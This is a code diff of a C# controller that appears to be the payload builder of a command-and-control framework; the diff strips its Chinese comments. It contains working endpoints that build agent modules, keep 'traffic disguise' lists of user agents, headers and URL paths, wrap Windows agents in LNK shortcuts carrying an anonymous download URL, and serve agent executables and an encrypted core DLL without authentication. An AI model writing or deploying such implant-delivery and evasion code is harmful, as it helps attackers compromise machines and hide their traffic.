@@ -107,8 +107,6 @@ public class BuilderController : ControllerBase
     }
 
     /// <summary>
-    /// 枚举平台模块目录中的模块（文件名驱动，含插件 staging 的 dll）：
-    /// 返回 [{name, enabled}]；禁用 = 文件被重命名为 {name}.{ext}.disable。
     /// </summary>
     [HttpGet("modules")]
     public IActionResult ListModules([FromQuery] string platform = "x64")
@@ -133,7 +131,6 @@ public class BuilderController : ControllerBase
         return Ok(new { modules });
     }
 
-    /// <summary>启用/禁用模块：重命名 {name}.{ext} ↔ {name}.{ext}.disable（保留文件可恢复）。</summary>
     [HttpPost("modules/toggle")]
     public IActionResult ToggleModule([FromBody] ToggleModuleRequest req)
     {
@@ -166,9 +163,7 @@ public class BuilderController : ControllerBase
         return Ok(new { status = "ok", name = req.Name, enabled = req.Enabled });
     }
 
-    // ── 流量伪装持久化列表 ──────────────────────────────────────────────
 
-    /// <summary>读取流量伪装三组列表（UA/附加头/路径后缀，含启用状态）。</summary>
     [HttpGet("lists")]
     public async Task<IActionResult> GetLists(CancellationToken ct)
     {
@@ -181,7 +176,6 @@ public class BuilderController : ControllerBase
         });
     }
 
-    /// <summary>增加一项（enabled=true），返回完整列表。</summary>
     [HttpPost("lists/item")]
     public async Task<IActionResult> AddListItem([FromBody] AddBuildListItemRequest req, CancellationToken ct)
     {
@@ -194,7 +188,6 @@ public class BuilderController : ControllerBase
         return Ok(ToDto(doc));
     }
 
-    /// <summary>切换某项启用状态，返回完整列表。</summary>
     [HttpPost("lists/toggle")]
     public async Task<IActionResult> ToggleListItem([FromBody] ToggleBuildListItemRequest req, CancellationToken ct)
     {
@@ -211,7 +204,6 @@ public class BuilderController : ControllerBase
         }
     }
 
-    /// <summary>删除某项，返回完整列表。</summary>
     [HttpPost("lists/delete")]
     public async Task<IActionResult> DeleteListItem([FromBody] DeleteBuildListItemRequest req, CancellationToken ct)
     {
@@ -236,8 +228,6 @@ public class BuilderController : ControllerBase
     };
 
     /// <summary>
-    /// 仅构建云模块（不构建 agent）：body { platform, enabledModules }。
-    /// 写入构建历史（FileName 带 modules- 前缀区分），日志走 stream/{buildId}。
     /// </summary>
     [HttpPost("modules")]
     public IActionResult BuildModules([FromBody] BuildModulesRequest req)
@@ -384,12 +374,9 @@ public class BuilderController : ControllerBase
         if (!System.IO.File.Exists(filePath))
             return NotFound(new { error = "Build file not found on disk." });
 
-        // 按需打包格式：仅 Windows 支持 lnk（构建产物不变）。
-        // Linux 载荷没有 EXE/LNK 概念：直接下载原始可执行文件。
         var isWindows = BuilderBuildService.PlatformOs.TryGetValue(record.Platform, out var os) && os == "windows";
         if (isWindows && string.Equals(format, "lnk", StringComparison.OrdinalIgnoreCase))
         {
-            // 快捷方式内嵌匿名下载 URL（agent 可执行文件直出，无需鉴权）
             var scheme = Request.Scheme;
             var host = Request.Host.Value;
             var url = $"{scheme}://{host}/api/beacon/artifact/{buildId}";
@@ -402,9 +389,6 @@ public class BuilderController : ControllerBase
     }
 
     /// <summary>
-    /// 匿名下载已构建的 agent 可执行文件（/api/beacon/artifact/{buildId}）。
-    /// 供「一键命令」/ LNK 内嵌下载使用：无鉴权、无枚举防护（复用 8 位 buildId），
-    /// 删除构建记录即失效。仅对 Windows 构建开放（Linux 载荷无 exe 概念）。
     /// </summary>
     [HttpGet("/api/beacon/artifact/{buildId}")]
     [AllowAnonymous]
@@ -539,10 +523,6 @@ public class BuilderController : ControllerBase
     }
 
     // ── Core DLL delivery ────────────────────────────────────────────────
-    // 旧端点（/api/beacon/core/{buildId}）保留兼容旧 agent，但核心防枚举逻辑
-    // 已统一到 /api/v1/models/{buildId}?t=<一次性凭证>（见 V1BootstrapController）。
-    // 本端点维持无鉴权（DLL 为 AES-256-GCM 密文，密钥协商需 beaconSecret），
-    // 不在此发放新凭证；新构建的 loader 一律走 v1 通道。
 
     [HttpGet("/api/beacon/core/{buildId}")]
     [AllowAnonymous]
@@ -557,8 +537,6 @@ public class BuilderController : ControllerBase
     }
 }
 
-/// <summary>仅构建模块的请求体。</summary>
 public record BuildModulesRequest(string Platform, List<string>? EnabledModules);
 
-/// <summary>启用/禁用模块的请求体。</summary>
 public record ToggleModuleRequest(string Platform, string Name, bool Enabled);
